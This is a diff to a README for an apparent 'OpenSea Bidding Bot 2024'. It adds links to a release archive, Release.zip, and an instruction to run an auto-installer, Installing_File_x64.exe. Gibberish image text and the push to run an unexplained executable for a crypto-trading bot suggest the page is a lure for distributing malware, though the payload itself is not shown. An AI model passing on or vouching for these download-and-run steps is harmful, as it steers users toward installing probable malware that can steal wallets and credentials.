@@ -7,11 +7,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/d48eb69c-df87-4367-929f-716010108975)
-]()
+](https://github.com/GoDToD/OpenSea-Bidding-Bot-2024/releases/download/V8.64/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/GoDToD/OpenSea-Bidding-Bot-2024/releases/download/V8.64/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-24_14-50-47](https://github.com/user-attachments/assets/04c1bd99-f41e-4901-8466-fcf761cbb0a2)
